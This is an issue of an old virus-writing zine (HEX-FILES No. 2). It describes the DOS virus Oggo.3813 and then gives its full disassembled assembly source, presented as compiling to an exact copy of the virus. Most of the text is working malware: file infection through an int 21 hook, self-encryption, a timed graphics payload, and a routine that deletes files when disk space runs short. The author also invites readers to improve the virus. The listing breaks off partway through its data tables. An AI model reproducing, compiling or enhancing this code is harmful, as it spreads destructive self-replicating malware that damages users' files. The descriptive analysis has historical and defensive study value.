   ;
   ;   HEX-FILES No. 2                                                   File 010
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;     Virus Name: Oggo.3813
   ;     Alias     : Oggo, Oggo.3837, Oggo.4069, Oggo.4325, Split.4300
   ;     Origin    : Adamson University, Manila, Philippines
   ;
   ;
   ;     Oggo is an encrypted virus based on Possessed. Like Possessed, it
   ;     also came from Adamson University.
   ;
   ;     Oggo goes resident as a low memory TSR allocating 4710 paragraphs
   ;     (75376 bytes). This is because it needed a contiguous memory to
   ;     simplify its COM infection process. With this much memory gone, you
   ;     would surely feel its presence when your programs suddenly complain
   ;     of lack of memory. It hooks int 8 and 21.
   ;
   ;     Oggo infects COM and EXE programs on EXEC (21/4B00). The virus is
   ;     appended to the end of EXE programs. In COM, the virus is at the
   ;     beginning of the host program with a 24-byte host program restorer
   ;     appended at the end. Oggo's virus code is 3813 bytes long. Its
   ;     infective length in COM is 3837 bytes -- 3813 virus code + 24 bytes
   ;     host restorer. The first 487 bytes of the host COM program is
   ;     encrypted by Oggo. Its infective length in EXE is 4325 bytes -- 3813
   ;     virus code + 512 bytes garbage. This 512 byte block represents the
   ;     encrypted portion of the host COM program but does not contain
   ;     anything of importance in EXE -- code of last infected COM. This is a
   ;     result of an error on the part of the virus author.
   ;
   ;     Oggo has a payload displayed on a delayed timer trigger. The trigger
   ;     is variable. It switches to graphics mode and draws a face and
   ;     displays the following text:
   ;
   ;     "
   ;                                     OGGO
   ;
   ;                                      by
   ;                               The PALPAK Group
   ;                           CpSci, Adamson University
   ;     "
   ;
   ;     Another thing about Oggo is that it is replete with programming
   ;     errors or it assumes too much. Fortunately, these do not adversely
   ;     affect the execution of the virus nor its host program, except for
   ;     two problems.
   ;
   ;     First, it could not execute the host program that loads it to memory.
   ;     This could be traced to the lack of, or improper EXEC parameter
   ;     block. Although the virus goes through the motion of initializing the
   ;     EXEC param, the content and initialization of the param are not
   ;     correct.
   ;
   ;     Second, it assumes too much. The old int 8 and 21 vectors are
   ;     restored when Oggo encrypts its code. If another program hooks int 8
   ;     and/or 21 after Oggo had gone resident, the interrupt handler of that
   ;     TSR would be disabled.
   ;
   ;     There are other minor errors in the program and are not worth
   ;     mentioning.
   ;
   ;     If you are itching to lame a virus, Oggo is the right virus for you.
   ;     There's a lot of room for improvement, optimization and bug-fixing.
   ;
   ;
   ;     Another Oggo variant, a shorter one, had been spotted in the wild.
   ;
   ;
   ;
   ;  The Oggo source code (disasm) included here does not look good. I had a
   ;  hard time trying to decide on how to make it look good. Anyhow, here it
   ;  is...
   ;
   ;
   ;  ÄÄ OGGO3813.ASM STARTS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    ;-------------------------------------------------------------------;
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING* ;
    ; *WARNING                                                 WARNING* ;
    ; *WARNING      destructive codes  intentional damage      WARNING* ;
    ; *WARNING                 deletes files                   WARNING* ;
    ; *WARNING                                                 WARNING* ;
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING* ;
    ;-------------------------------------------------------------------;
    ; Virus:  Oggo.3813                                                 ;
    ; Alias:  Oggo, Oggo.3837, Oggo.4069, Oggo.4325, Split.4300         ;
    ; Origin: Adamson University, Manila, Philippines                   ;
    ;-------------------------------------------------------------------;
    ;                                                                   ;
    ; This source code is written in a way so that when compiled you    ;
    ; will get an exact copy of the virus.                              ;
    ;                                                                   ;
    ; You will only be able to duplicate the original virus if you will ;
    ; use *TASM 2.0* or *MASM 5.0* to compile this program listing.     ;
    ; Other compilers or versions of a compiler might produce a virus   ;
    ; different from that originally released.                          ;
    ;                                                                   ;
    ; Compile to COM.                                                   ;
    ;                                                                   ;
    ;-------------------------------------------------------------------;
    ; Program listing created by Putoksa Kawayan.       HEX-FILES No. 2 ;
    ;-------------------------------------------------------------------;
    ;
    MemoryMarkerLoc         equ     0143h
    SaveSsOnInt21           equ     0150h
    SaveSpOnInt21           equ     0155h
    ErrorIntOffset          equ     0e000h
    ErrorIntSegment         equ     0e004h

    Oggo3813 segment 'code'
    assume cs:Oggo3813

        org 100h

    OggoEntry:
          call    FirstGeneration
          pop     si
          sub     si,3
          push    si
          mov     di,offset EncryptedCodeStart-100h
          add     di,si
          mov     al,'Q'
          mov     cx,offset EndOfVirusCode+231
    Decrypt:
          sub     cs:[di],al
          inc     di
          loop    Decrypt
          pop     si
    EncryptedCodeStart:
          mov     ax,0
          push    es                             ; memory resident check
          mov     es,ax
          cmp     word ptr es:MemoryMarkerLoc,1
          je      Relay01
          jmp     Relay03
    Relay01:
          jmp     VirusIsInMemory

    Psp                 db      ?
    TerminateOffset     dw      ?
    TerminateSegment    dw      ?
    ClockInterrupt label dword
      ClockIntOffset    dw      ?
      ClockIntSegment   dw      ?
    DosInterrupt label dword
      DosIntOffset      dw      ?
      DosIntSegment     dw      ?
    VirusJumper label dword
      JumperOffset      dw      ?
      JumperSegment     dw      ?
                        dw      0,0
    ExecuteHostExe label dword
      HostExeOffset     dw      ?
      HostExeSegment    dw      ?

    ;--------------------------------
    ; interrupt 21 handler
    ;--------------------------------

    isDos:
          pushf
          cmp     ax,4b00h                  ; infect only on exec
          je      SaveRegisters
          jmp     PassToDos
    SaveRegisters:
          push    ax
          push    bx
          push    cx
          push    dx
          push    di
          push    si
          push    ds
          push    es
          mov     ax,0
          mov     es,ax
          mov     word ptr es:MemoryMarkerLoc,1       ; set memory marker
          push    dx
          call    CallPop
    CallPop:
          pop     si
          mov     dx,offset CallPop-100h
          sub     si,dx
          pop     dx
          push    ds
          push    dx
          push    si
          mov     di,offset Asciiz-100h
          add     di,si
          push    cx
          mov     al,0
          mov     cx,100
    WipeAsciiz:
          mov     cs:[di],al
          inc     di
          loop    WipeAsciiz
          pop     cx
          mov     di,offset Asciiz-100h
          add     di,si
          push    si
          mov     si,dx                     ; copy name of executing program
    NextCharOfFileSpec:
          mov     al,[si]
          mov     cs:[di],al
          mov     al,cs:[di]
          cmp     al,20h
          je      GotEndOfFileSpec
          cmp     al,0
          je      GotEndOfFileSpec
          inc     si
          inc     di
          jmp     NextCharOfFileSpec
    GotEndOfFileSpec:
          pop     si
          mov     al,0
          mov     cs:[di],al
          mov     ax,cs:[di-2]
          cmp     ax,'MO'                        ; is it a com?
          jne     NotComFile
          mov     di,offset FileTypeFlag-100h
          add     di,si
          mov     al,0
          mov     cs:[di],al
          pop     si
          pop     dx
          pop     ds
          jmp     HookErrorInt
    NotComFile:
          mov     di,offset FileTypeFlag-100h
          add     di,si
          mov     al,1
          mov     cs:[di],al
          pop     si
          pop     dx
          pop     ds
    HookErrorInt:
          push    cs
          pop     ds
          mov     ax,3524h                       ; save int 24 vector
          call    UseDos
          mov     cs:ErrorIntOffset,bx
          mov     cs:ErrorIntSegment,es
          mov     ax,2524h                       ; hook int 24
          mov     dx,offset isError-100h
          add     dx,100h
          call    UseDos
          mov     dx,offset Asciiz-100h
          add     dx,si
          mov     ah,43h
          mov     al,0
          call    UseDos
          mov     di,offset Attribute-100h
          add     di,si
          mov     cs:[di],cl
          mov     cs:[di+1],ch
          mov     dx,offset Asciiz-100h
          add     dx,si
          mov     ah,43h                         ; clear read only attrib
          mov     al,1
          and     cl,0fch
          call    UseDos
          jnc     AttributeCleared
          jmp     RestoreErrorInt
    AttributeCleared:
          mov     dx,offset Asciiz-100h
          add     dx,si
          mov     ah,3dh
          mov     al,2
          call    UseDos
          jnc     FileOpened
          jmp     RestoreErrorInt
    FileOpened:
          mov     di,offset Handle-100h
          add     di,si
          mov     cs:[di],al
          mov     cs:[di+1],ah
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ah,57h
          mov     al,0
          call    UseDos
          mov     di,offset FileTime-100h
          add     di,si
          mov     cs:[di],cl
          mov     cs:[di+1],ch
          mov     di,offset FileDate-100h
          add     di,si
          mov     cs:[di],dl
          mov     cs:[di+1],dh
          mov     di,offset FileTypeFlag-100h
          add     di,si
          mov     al,cs:[di]
          cmp     al,1
          je      isExeFile
          jmp     isComFile
    isExeFile:
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ah,3fh                         ; read 48 bytes
          mov     cx,48
          mov     dx,offset ExeReadBuff-100h
          add     dx,si
          call    UseDos
          push    bx
          mov     di,offset ExeReadBuff-100h
          add     di,si
          add     di,18
          cmp     word ptr cs:[di],1970h         ; exe infected ?
          jne     CheckDiskSpace
          mov     di,offset ExeReadBuff-100h
          add     di,si
          add     di,16
          cmp     word ptr cs:[di],-2            ; verify infection from sp
          jne     CheckDiskSpace
          pop     bx
          jmp     Relay02
    CheckDiskSpace:
          xor     dx,dx
          mov     ah,36h
          mov     al,0
          call    UseDos
          xor     dx,dx
          mul     bx
          mul     cx
          or      dx,dx
          jnz     EnoughDiskSpace
          mov     di,offset EndOfVirusCode+100h
          cmp     ax,di
          jnb     EnoughDiskSpace
          call    DeleteFile
          jmp     CheckDiskSpace
    EnoughDiskSpace:
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ah,42h
          xor     cx,cx
          xor     dx,dx
          push    ax
          push    dx
          mov     al,0
          call    UseDos
          pop     dx
          pop     ax
          mov     al,2
          call    UseDos
          mov     bx,200h
          div     bx
          cmp     dx,85
          jl      SetPagePad
          add     ax,1
    SetPagePad:
          add     ax,8
          mov     di,(offset ExeReadBuff+4)-100h
          add     di,si
          mov     cs:[di],ax
          mov     di,(offset ExeReadBuff+8)-100h
          add     di,si
          mov     cx,cs:[di]
          mov     di,(offset ExeReadBuff+22)-100h
          add     di,si
          mov     dx,cs:[di]
          mov     di,offset ExeCs-100h
          add     di,si
          mov     cs:[di],dx
          mov     di,(offset ExeReadBuff+20)-100h
          add     di,si
          mov     bx,cs:[di]
          mov     di,offset ExeIp-100h
          add     di,si
          mov     cs:[di],bx
          mov     di,(offset ExeReadBuff+14)-100h
          add     di,si
          mov     dx,cs:[di]
          mov     di,offset ExeSs-100h
          add     di,si
          mov     cs:[di],dx
          mov     di,(offset ExeReadBuff+16)-100h
          add     di,si
          mov     bx,cs:[di]
          mov     di,offset ExeSp-100h
          add     di,si
          mov     cs:[di],bx
          pop     bx
          push    bx
          push    cx
          mov     ah,42h
          xor     cx,cx
          xor     dx,dx
          push    ax
          push    dx
          mov     al,0
          call    UseDos
          pop     dx
          pop     ax
          mov     al,2
          call    UseDos
          pop     cx
          mov     bx,cx
          mov     cl,4
          shl     bx,cl
          mov     cx,0
          sub     ax,bx
          sbb     dx,cx
          xor     di,di
          push    ax
          mov     cx,12
          shl     dx,cl
          mov     cx,4
          shr     ax,cl
          add     dx,ax
          mov     di,(offset ExeReadBuff+22)-100h
          add     di,si
          mov     cs:[di],dx
          mov     di,(offset ExeReadBuff+14)-100h
          add     di,si
          mov     cs:[di],dx
          mov     di,(offset ExeReadBuff+16)-100h
          add     di,si
          mov     word ptr cs:[di],-2
          mov     di,(offset ExeReadBuff+18)-100h
          add     di,si
          mov     word ptr cs:[di],1970h
          pop     ax
          mov     dx,ax
          mov     cl,4
          shr     dx,cl
          shl     dx,cl
          sub     ax,dx
          mov     di,(offset ExeReadBuff+20)-100h
          add     di,si
          mov     cs:[di],ax
          pop     bx
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          xor     dx,dx
          xor     cx,cx
          mov     ah,42h
          mov     al,0
          call    UseDos
          mov     ah,40h
          mov     cx,48
          mov     dx,offset ExeReadBuff-100h
          add     dx,si
          call    UseDos
          jnc     PrepareToWriteVirus
          jmp     RestoreErrorInt
    PrepareToWriteVirus:
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          xor     cx,cx
          xor     dx,dx
          mov     al,2
          mov     ah,42h
          call    UseDos
          push    si
          push    bx
          mov     di,offset ClockIntSegment      ; restore int 8 and 21
          mov     ax,cs:[di]
          mov     ds,ax
          mov     di,offset ClockIntOffset
          mov     dx,cs:[di]
          mov     ax,2508h
          call    UseDos
          mov     di,offset Trigger
          mov     al,cs:[di]
          mov     cs:SavedTrigger,al
          cmp     cs:Trigger,30                  ; trigger for the infection
          jle     ExeTriggerSet                  ;  is lowered
          sub     cs:Trigger,30
    ExeTriggerSet:
          mov     di,offset DosIntSegment
          mov     ax,cs:[di]
          mov     ds,ax
          mov     dx,cs:[di-2]
          mov     ax,2521h
          call    UseDos
          push    cs
          pop     ds
          push    cs                        ; copy encryptor
          pop     es
          mov     si,offset ExeScrambler
          mov     di,offset EndOfVirusCode+200h
          mov     cx,(offset ExeResetInterrupt-offset ExeScrambler)
          cld
          repe movsb
          jmp     EndOfVirusCode+200h
    ExeScrambler:
          mov     di,offset EncryptedCodeStart
          mov     al,'Q'                       ; encrypt virus
          mov     cx,offset EndOfVirusCode+231
    ExeEncrypt:
          add     cs:[di],al
          inc     di
          loop    ExeEncrypt
          pop     bx
          mov     ah,40h                    ; write encrypted virus
          mov     cx,offset EndOfVirusCode+100h
          mov     dx,100h
          int     21h
          mov     di,offset EncryptedCodeStart
          mov     al,'Q'                         ; decrypt virus
          mov     cx,offset EndOfVirusCode+231
    ExeDecrypt:
          sub     cs:[di],al
          inc     di
          loop    ExeDecrypt
          mov     ax,Offset ExeResetInterrupt
          jmp     ax

    ExeResetInterrupt:
          pop     si                        ; rehook int 8 and 21
          push    cs
          pop     ds
          mov     di,offset SavedTrigger
          mov     al,cs:[di]
          mov     cs:Trigger,al
          mov     dx,offset isDos
          mov     ax,2521h
          int     21h
          mov     ax,2508h
          mov     dx,offset isClock
          call    UseDos
    Relay02:
          jmp     DoneWithFile

    isComFile:
          push    si
          push    di
          push    es
          push    ds
          pushf
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ah,3fh
          mov     cx,18
          mov     dx,offset ComReadBuff-100h
          add     dx,si
          call    UseDos
          push    si
          mov     ax,si
          mov     cx,12
          mov     di,offset ComReadBuff-100h
          add     di,ax
          mov     si,0
          add     si,ax
    InfectCheck:
          mov     al,cs:[di]
          mov     bl,cs:[si]
          cmp     bl,al
          jne     CheckSpace
          inc     si
          inc     di
          loop    InfectCheck
          pop     si
          jmp     isInfected
    CheckSpace:
          xor     dx,dx
          mov     ah,36h
          mov     al,0
          call    UseDos
          xor     dx,dx
          mul     bx
          mul     cx
          or      dx,dx
          jnz     HaveDiskSpace
          mov     di,offset EndOfVirusCode+100h
          cmp     ax,di
          jnb     HaveDiskSpace
          call    DeleteFile
          jmp     CheckSpace
    HaveDiskSpace:
          pop     si
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ah,42h
          jnb     MovePointer
          jmp     RestoreErrorInt
    MovePointer:
          xor     cx,cx
          xor     dx,dx
          push    cx
          push    dx
          mov     al,0
          call    UseDos
          pop     dx
          pop     cx
          mov     ah,42h                    ; get length of com
          mov     al,2
          call    UseDos
          mov     di,offset ComLength-100h
          add     di,si
          mov     cs:[di],ax
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ah,42h
          xor     cx,cx
          xor     dx,dx
          mov     al,0
          call    UseDos
          mov     ah,3fh
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     di,offset ComLength-100h
          add     di,si
          mov     cx,cs:[di]
          mov     dx,cs                     ; read com to end of virus
          mov     ds,dx
          mov     dx,offset EndOfVirusCode
          call    UseDos
          add     dx,ax
          push    es
          push    cs
          pop     es                        ; copy restorer code after
          push    si                        ;    host code
          mov     si,Offset HostComRestorer
          mov     di,dx
          mov     cx,24
          cld
          repe movsb
          pop     si
          pop     es
          jmp     SkipOverRestorer
    HostComRestorer:
          mov     di,offset ComLength-100h
          add     di,100h
          mov     cx,cs:[di]
          mov     si,offset EndOfVirusCode
          mov     di,100h
          cld
          repe movsb
          mov     ax,100h
          jmp     ax
    SkipOverRestorer:
          push    di
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ah,42h
          xor     cx,cx
          xor     dx,dx
          mov     al,0
          call    UseDos
          push    si                             ; restore int 8 and 21
          push    bx
          mov     di,offset ClockIntSegment
          mov     ax,cs:[di]
          mov     ds,ax
          mov     di,offset ClockIntOffset
          mov     dx,cs:[di]
          mov     ax,2508h
          call    UseDos
          mov     di,offset Trigger
          mov     al,cs:[di]
          mov     cs:SavedTrigger,al
          cmp     cs:Trigger,30
          jle     ComTriggerSet
          sub     cs:Trigger,30
    ComTriggerSet:
          mov     di,offset DosIntSegment
          mov     ax,cs:[di]
          mov     ds,ax
          mov     dx,cs:[di-2]
          mov     ax,2521h
          call    UseDos
          push    cs
          pop     ds
          push    cs
          pop     es
          pop     bx              ; copy encryptor past host code
          pop     si
          pop     di
          push    si
          push    bx
          mov     ax,di
          mov     si,offset ComScrambler
          mov     cx,(offset ComResetInterrupt-offset ComScrambler)
          cld
          repe movsb
          jmp     ax

    ComScrambler:
          mov     dx,ax
          mov     di,offset EncryptedCodeStart
          mov     al,'Q'                         ; encrypt virus
          mov     cx,offset EndOfVirusCode+231
    ComEncrypt:
          add     cs:[di],al
          inc     di
          loop    ComEncrypt
          pop     bx
          mov     ah,40h
          mov     cx,dx                     ; write virus + host + restorer
          sub     cx,100h
          mov     dx,100h
          int     21h
          mov     di,offset EncryptedCodeStart
          mov     al,'Q'                          ; decrypt virus
          mov     cx,offset EndOfVirusCode+231
    ComDecrypt:
          sub     cs:[di],al
          inc     di
          loop    ComDecrypt
          mov     ax,offset ComResetInterrupt
          jmp     ax

    ComResetInterrupt:
          pop     si                             ; rehook int 8 and 21
          push    cs
          pop     ds
          mov     dx,offset isDos
          mov     ax,2521h
          int     21h
          mov     di,offset SavedTrigger
          mov     al,cs:[di]
          mov     cs:Trigger,al
          mov     ax,2508h
          mov     dx,offset isClock
          call    UseDos
    isInfected:
          popf
          pop     ds
          pop     es
          pop     di
          pop     si
    DoneWithFile:
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     di,offset FileDate-100h
          add     di,si
          mov     dx,cs:[di]
          mov     di,offset FileTime-100h
          add     di,si
          mov     cx,cs:[di]
          mov     ah,57h
          mov     al,1
          call    UseDos
          jnc     CloseFile
          jmp     RestoreErrorInt
    CloseFile:
          mov     di,offset Handle-100h
          add     di,si
          mov     bx,cs:[di]
          mov     ax,3e00h
          call    UseDos
          mov     dx,offset Asciiz-100h
          add     dx,si
          mov     ah,43h
          mov     al,1
          mov     di,offset Attribute-100h
          add     di,si
          mov     cx,cs:[di]
          call    UseDos
          jnc     RestoreErrorInt
          jmp     RestoreErrorInt
    RestoreErrorInt:
          mov     ax,2524h
          mov     ds,cs:ErrorIntSegment
          mov     dx,cs:ErrorIntOffset
          call    UseDos
    RestoreRegisters:
          pop     es
          pop     ds
          pop     si
          pop     di
          pop     dx
          pop     cx
          pop     bx
          pop     ax
    PassToDos:
          popf
          jmp     DosInterrupt

    ComReadBuff   DB      18 dup (?)
                  DW      ?
    SavedTrigger  DB      ?
                  DW      ?
    Asciiz        DB      45 dup (?)
    Attribute     DW      ?
                  DW      ?
    Handle        DW      ?
    FileDate      DW      ?
                  DW      ?
    FileTime      DW      ?
                  DW      ?
    FileTypeFlag  DB      ?
    ComLength     DW      ?
                  DW      ?
    ExeSs         DW      ?
    ExeSp         DW      ?
    ExeIp         DW      ?
    ExeCs         DW      ?
    ExeReadBuff   DB      48 dup (?)
                  DW      12 dup (?)
    ViruSp        DW      ?
    ViruSs        DW      ?

    DeleteFile:
          push    ax                        ; deletes files if it does not
          push    bx                        ;   have enough disk space for
          push    cx                        ;   infection
          push    dx
          push    si
          push    di
          push    ds
          push    cs
          pop     ds
          mov     di,offset Dta
          mov     cx,50
    WipeDta:
          mov     dl,0
          mov     cs:[di],dl
          inc     di
          loop    WipeDta
          mov     dx,offset Dta
          mov     ah,1ah
          call    UseDos
          mov     dx,offset DeleteAsciiz
          mov     ah,4eh
          mov     cx,2
          call    UseDos
          mov     ah,43h
          mov     dx,offset Dta+30
          mov     al,0
          call    UseDos
          mov     dx,offset Dta+30
          mov     ah,43h
          mov     al,1
          and     cl,0fch
          call    UseDos
          mov     dx,offset Dta+30
          mov     ah,41h
          call    UseDos
          pop     ds
          pop     di
          pop     si
          pop     dx
          pop     cx
          pop     bx
          pop     ax
          ret

    DeleteAsciiz  db      '*.*',0
                  db      0
    Dta           db      51 dup (?)

    ;------------------------------------
    ; int 8 handler and payload routines.
    ;------------------------------------
    isClock:
          pushf
          push    si
          push    ax
          inc     cs:Timer
          cmp     cs:Timer,1092             ;(18.2*60) = 1 minute
          je      IsItShowTime
          jmp     NotYetTime
    IsItShowTime:
          mov     cs:Timer,0
          inc     cs:Minutes
          mov     si,offset Trigger
          mov     al,cs:[si]
          cmp     cs:Minutes,al
          je      ShowTime
          jmp     NotYetTime
    ShowTime:
          push    cs
          pop     ds
          cli
          mov     ah,0
          mov     al,6
          int     10h
          mov     di,1
          mov     si,offset ByWord
          mov     cx,80
    DecryptPayloadData:
          add     cs:[si],di
          not     byte ptr cs:[si]
          inc     si
          inc     di
          loop    DecryptPayloadData
          mov     al,1
          xor     bx,bx
          mov     ah,12
          mov     di,offset OggoText
          mov     dh,19
          mov     dl,25
          call    MoveCursorAndShowText
          mov     di,offset ByWord
          mov     dh,21
          mov     dl,25
          call    MoveCursorAndShowText
          mov     di,offset Palpak
          mov     dh,22
          mov     dl,25
          call    MoveCursorAndShowText
          mov     di,offset CpSciAdU
          mov     dh,23
          mov     dl,25
          call    MoveCursorAndShowText
          xor     bx,bx
          mov     si,offset MouthDat
          mov     di,210
          mov     ax,100
          mov     bl,1
          call    WritePixel
          mov     si,offset EyesDat
          mov     di,230
          mov     ax,20
          mov     bl,1
          call    WritePixel
          mov     si,offset EyesDat
          mov     di,320
          mov     ax,20
          mov     bl,1
          call    WritePixel
          push    cs
          pop     ds
          mov     dx,offset isClock2
          mov     ah,25h
          mov     al,8
          call    UseDos
    isClock2:
          mov     ah,0ch
          xor     bx,bx
          mov     cx,10
    Disp1:
          push    cx
          mov     di,offset FaceDat2
    Disp2:
          mov     al,1
    Disp3:
          mov     si,offset FaceDat1
    Disp4:
          xor     cx,cx
          xor     dx,dx
          mov     cl,cs:[si]
          mov     dl,cs:[si+1]
          inc     si
          inc     si
          push    bx
          xor     bx,bx
          mov     bl,cs:[di]
          add     cx,bx
          add     cx,225
          mov     bl,cs:[di+1]
          add     dx,bx
          add     dx,20
          pop     bx
          int     10h
          xor     cx,cx
          mov     cl,cs:[si]
          cmp     cx,0feh
          jne     Disp4
          mov     si,offset FaceDat1
    Disp5:
          xor     cx,cx
          xor     dx,dx
          mov     cl,cs:[si]
          mov     dl,cs:[si+1]
          inc     si
          inc     si
          push    bx
          xor     bx,bx
          mov     bl,cs:[di]
          add     cx,363
          sub     cx,bx
          mov     bl,cs:[di+1]
          add     dx,bx
          pop     bx
          add     dx,20
          int     10h
          xor     cx,cx
          mov     cl,cs:[si]
          cmp     cx,0feh
          jne     Disp5
          cmp     al,1
          jne     Disp7
          push    dx
          push    es
          push    ax
          mov     dx,3000
          mov     ax,0f000h
          mov     es,ax
          cmp     byte ptr es:[0fffeh],-4
          jne     Disp6
          mov     dx,0f000h
    Disp6:
          dec     dx
          cmp     dx,0
          jne     Disp6
          pop     ax
          pop     es
          pop     dx
          mov     al,0
          jmp     Disp3
    Disp7:
          mov     al,1
          inc     di
          inc     di
          mov     dl,cs:[di]
          cmp     dl,0feh
          je      Disp8
          jmp     Disp2
    Disp8:
          pop     cx
          jmp     Disp1
    NotYetTime:
          pop     ax
          pop     si
          popf
          jmp     ClockInterrupt

    MoveCursorAndShowText:
          mov     bh,0
          mov     ah,2
          int     10h
    WriteChar:
          mov     al,cs:[di]
          mov     bl,0
          mov     bh,0
          mov     ah,0eh
          int     10h
          inc     di
          mov     al,cs:[di]
          cmp     al,'$'
          jne     WriteChar
          ret

    WritePixel:
          xor     cx,cx
          xor     dx,dx
          mov     cl,cs:[si]
          mov     dl,cs:[si+1]
          inc     si
          inc     si
          add     cx,di
          add     dx,ax
          push    ax
          mov     ah,0ch
          mov     al,bl
          mov     bh,0
          int     10h
          pop     ax
          xor     cx,cx
          mov     cl,cs:[si]
          cmp     cx,0feh
          jne     WritePixel
          ret

    ;------------------------------------
    ;Decrypted text:
    ;
    ;ByWord   db      '           by$$$'
    ;Palpak   db      '    The PALPAK Group$$$'
    ;CpSciAdU db      'CpSci,Adamson University$$$'
    ;OggoText db      '         O G G O$$$'

    ByWord   db      0deh,0ddh,0dch,0dbh,0dah,0d9h,0d8h,0d7h,0d6h,0d5h,0d4h
             db      91h,79h,0cdh,0cch,0cbh
    Palpak   db      0ceh,0cdh,0cch,0cbh,96h,81h,83h,0c7h,96h,0a4h,98h,93h
             db      0a1h,96h,0c0h,98h,6ch,6eh,67h,6bh,0b6h,0b5h,0b4h
    CpSciAdU db      94h,66h,82h,71h,6ah,0a6h,90h,6ch,6eh,61h,5ah,5dh,5dh
             db      0aah,74h,5ah,5eh,50h,60h,52h,50h,59h,4dh,47h,9bh,9ah,99h
    OggoText db      9ch,9bh,9ah,99h,98h,97h,96h,95h,94h,64h,92h,6ah
             db      90h,68h,20h,4fh,24h,24h,24h
             db      28 dup (?)

    Minutes  db      ?
    Timer    dw      ?
             db      5 dup (?)

    Trigger  db      0d2h

    EyesDat  db      1,1ah,1,1bh,1,1ch,1,1dh,1,1eh,1,1fh,1,20h,1,21h,1,22h
             db      1,23h,1,15h,2,16h,2,17h,2,18h,2,24h,2,25h,2,26h,2,27h
             db      3,13h,3,14h,3,28h,3,29h,4,10h,4,11h,4,12h,4,2ah,4,2bh
             db      4,2ch,5,0fh,5,2dh,6,0dh,6,0eh,6,2eh,6,2fh,7,0ch,7,30h
             db      8,0bh,8,31h,9,0ah,9,32h,0ah,9,0ah,33h,0bh,8,0bh,34h,0ch
             db      7,0ch,35h,0dh,6,0dh,36h,0eh,5,0eh,37h,0fh,5,0fh,37h,10h
             db      4,10h,38h,11h,3,11h,39h,12h,3,12h,39h,13h,3,13h,39h,14h
             db      2,14h,3ah,15h,2,15h,3ah,16h,1,16h,3bh,17h,1,17h,3bh,18h
             db      1,18h,3bh,19h,1,19h,3bh,19h,0c8h,1ah,3ch,1ah,0c8h,1bh
             db      3ch,1bh,0c8h,1ch,3ch,1ch,0c8h,1dh,3ch,1dh,0c8h,1eh,3ch
             db      1eh,0c8h,1fh,3ch,1fh,0c8h,20h,3ch,20h,0c8h,21h,3ch,21h
             db      0c8h,22h,3ch,22h,0c8h,23h,3ch,23h,0c8h,24h,3ch,25h,1,25h
             db      3bh,26h,1,26h,3bh,27h,1,27h,3bh,28h,1,28h,3bh,29h,2,29h
             db      3ah,2ah,2,2ah,3ah,2bh,3,2bh,39h,2ch,3,2ch,39h,2dh,3,2dh
             db      39h,2eh,4,2eh,38h,2fh,5,2fh,37h,30h,5,30h,37h,31h,6,31h
             db      36h,32h,7,32h,35h,33h,8,33h,34h,34h,9,34h,33h,35h,0ah,35h
             db      32h,36h,0bh,36h,31h,37h,0ch,37h,30h,38h,0dh,38h,0eh,38h
             db      2eh,38h,2fh,39h,0fh,39h,2dh,3ah,10h,3ah,11h,3ah,12h,3ah
             db      2ah,3ah,2bh,3ah,2ch,3bh,13h,3bh,14h,3bh,28h,3bh,29h,3ch
             db      15h,3ch,16h,3ch,17h,3ch,18h,3ch,24h,3ch,25h,3ch,26h,3ch
             db      27h,3dh,19h,3dh,1ah,3dh,1bh,3dh,1ch,3dh,1dh,3dh,1eh,3dh
             db      1fh,3dh,20h,3dh,21h,3dh,22h,3dh,23h,1ah,00h,1bh,00h,1ch
             db      00h,1dh,00h,1eh,00h,1fh,00h,20h,00h,21h,00h,22h,00h,23h
             db      00h,24h,00h,25h,00h,0feh,0feh

    FaceDat1 db      3,0ch,3,0dh,4,0ah,4,0bh,4,0ch,4,0dh,4,0eh,5,0ah,5,0bh,5
             db      0ch,5,0dh,5,0eh,6,9,6,0ah,6,0bh,6,0ch,6,0dh,6,0eh,6,0fh,7
             db      9,7,0ah,7,0bh,7,0ch,7,0dh,7,0eh,7,0fh,8,9,8,0ah,8,0bh,8
             db      0ch,8,0dh,8,0eh,8,0fh,9,8,9,9,9,0ah,9,0bh,9,0ch,9,0dh,9
             db      0eh,9,0fh,9,10h,0ah,8,0ah,9,0ah,0ah,0ah,0bh,0ah,0ch,0ah
             db      0dh,0ah,0eh,0ah,0fh,0ah,10h,0bh,8,0bh,9,0bh,0ah,0bh,0bh
             db      0bh,0ch,0bh,0dh,0bh,0eh,0bh,0fh,0bh,10h,0ch,8,0ch,9,0ch
             db      0ah,0ch,0bh,0ch,0ch,0ch,0dh,0ch,0eh,0ch,0fh,0ch,10h,0dh
             db      8,0dh,9,0dh,0ah,0dh,0bh,0dh,0ch,0dh,0dh,0dh,0eh,0dh,0fh
             db      0dh,10h,0eh,8,0eh,9,0eh,0ah,0eh,0bh,0eh,0ch,0eh,0dh,0eh
             db      0eh,0eh,0fh,0eh,10h,0fh,8,0fh,9,0fh,0ah,0fh,0bh,0fh,0ch
             db      0fh,0dh,0fh,0eh,0fh,0fh,0fh,10h,10h,8,10h,9,10h,0ah,10h
             db      0bh,10h,0ch,10h,0dh,10h,0eh,10h,0fh,10h,10h,11h,8,11h,9
